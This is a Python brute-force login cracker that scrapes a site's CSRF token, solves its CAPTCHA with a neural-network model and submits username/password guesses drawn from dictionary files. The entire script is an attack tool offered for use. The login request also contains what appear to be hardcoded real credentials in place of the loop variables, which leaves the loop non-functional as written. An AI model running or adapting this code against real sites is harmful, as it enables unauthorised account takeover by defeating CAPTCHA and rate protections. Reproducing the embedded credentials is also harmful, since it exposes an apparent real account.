from optparse import OptionParser
import os
import requests
from bs4 import BeautifulSoup

try:
    from app.util.captcha_break import predict_image
except Exception:
    import sys

    _file_abspath = os.path.abspath(__file__)
    sys.path.append(os.path.dirname(os.path.dirname(_file_abspath)))
    print(sys.path)
    from app.util.captcha_break import predict_image


def check_successfully(content):
    soup = BeautifulSoup(content, 'lxml')
    warning = soup.body.find_all(attrs={'class': 'alert alert-warning'})
    if "成功" in warning[0].text.split()[1]:
        return True
    return False


def get_captcha(image_name):
    # code = input("code: ")
    code = predict_image(image_name, model_path="../model/cnn.h5")
    return code


def crack(site, username, password):
    s = requests.Session()
    page_content = s.get(site).content  # 获得 Session
    soup = BeautifulSoup(page_content, 'lxml')
    csrf = soup.body.find_all(attrs={'id': 'csrf_token'})[0].attrs['value']

    # 获得验证码的值
    image_data = s.get(site + 'get_captcha').content
    image_name = 'image' + csrf + '.png'
    with open(image_name, 'wb') as image_file:
        image_file.write(image_data)
    captcha_code = get_captcha(image_name)
    os.remove(image_name)

    response = s.post(site + 'login', data={'csrf_token': csrf, 'username': 'tianzhijiao1119', 'password': '690847721',
                                            'captcha_code': captcha_code, 'submit': 'Login'})
    if check_successfully(response.content.decode()):
        return True, username, password
    return False, username, password


if __name__ == '__main__':
    usage = "Using cracker.py to break login by brute force."
    parser = OptionParser(usage)
    parser.add_option('-s', '--site', dest="site", type="string")
    parser.add_option('-d', '--dict', dest="data_dict", type="string")
    parser.add_option('-u', '--user', dest="user_dict", type="string")
    parser.add_option('-p', '--pass', dest="pass_dict", type="string")

    options, args = parser.parse_args()

    site = options.site
    if site is None:
        print("You should specify target host by -h or --host")
        exit(-1)

    data_dict_path = options.data_dict

    user_dict_path = None
    pass_dict_path = None

    username_list = []
    password_list = []
    if data_dict_path is None:
        user_dict_path = options.user_dict
        pass_dict_path = options.pass_dict
        if user_dict_path is None or pass_dict_path is None:
            print("You should specify target dict by -d or --dict\nOr you can specify user by -u and password by -p")
            exit(-1)
        if not os.path.exists(user_dict_path) or not os.path.exists(pass_dict_path):
            print("File %s or %s not found." % (data_dict_path, pass_dict_path))
            exit(-1)
        with open(user_dict_path, 'r') as user_dict:
            users = user_dict.read()
            username_list = users.split('\n')
        with open(pass_dict_path, 'r') as pass_dict:
            passwords = pass_dict.read()
            password_list = passwords.split('\n')
    else:
        if not os.path.exists(data_dict_path):
            print("File %s not found." % data_dict_path)
            exit(-1)
        with open(data_dict_path, 'r') as data_dict:
            data = data_dict.read()
            lines = data.split('\n')
            for line in lines:
                if len(line) > 2:
                    username = line.split(' ')[0]
                    password = line.split(' ')[1]
                    username_list.append(username)
                    password_list.append(password)

    # 开始爆破
    for index in range(len(username_list)):
        username = username_list[index]
        password = password_list[index]
        if len(username) <= 1 or len(password) <= 1:
            continue
        result, _, _ = crack(site, username, password)
        if result:
            print("Find correct username and password: %s - %s" % (username, password))
